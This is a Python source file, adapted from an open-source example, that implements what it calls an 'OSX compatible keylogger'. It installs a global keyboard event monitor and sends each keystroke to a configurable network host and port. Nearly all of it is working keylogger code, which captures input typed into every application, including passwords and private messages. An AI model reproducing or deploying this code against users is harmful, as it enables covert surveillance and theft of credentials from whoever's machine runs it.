"""Keypress monitor for OSX based systems."""
# Adapted from:
# cocoa_keypress_monitor.py by Bjarte Johansen is licensed under a 
# License: http://ljos.mit-license.org/
 
from AppKit import NSApplication, NSApp
from Foundation import NSObject, NSLog, NSString
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper
import argparse
from .keyserver import SimpleClient

__client = None



parser = argparse.ArgumentParser(description="OSX compatible keylogger that sends keys to a service.")
parser.add_argument("--host", default="localhost",
    help="The host to send keys to, defaults to localhost")
parser.add_argument("--port", type=int, default=8888,
    help="The port to send keys to, defaults to 8888")

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)
 
def handler(event):
    try:
        __client.send(event.characters()[0])
    except KeyboardInterrupt:
        AppHelper.stopEventLoop() #this should kill the app on CTRL+D, but that's not happening
 
def main():
    print("Launching keylogger…")
    global __client
    args = parser.parse_args()
    __client = SimpleClient(args.host, args.port)
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()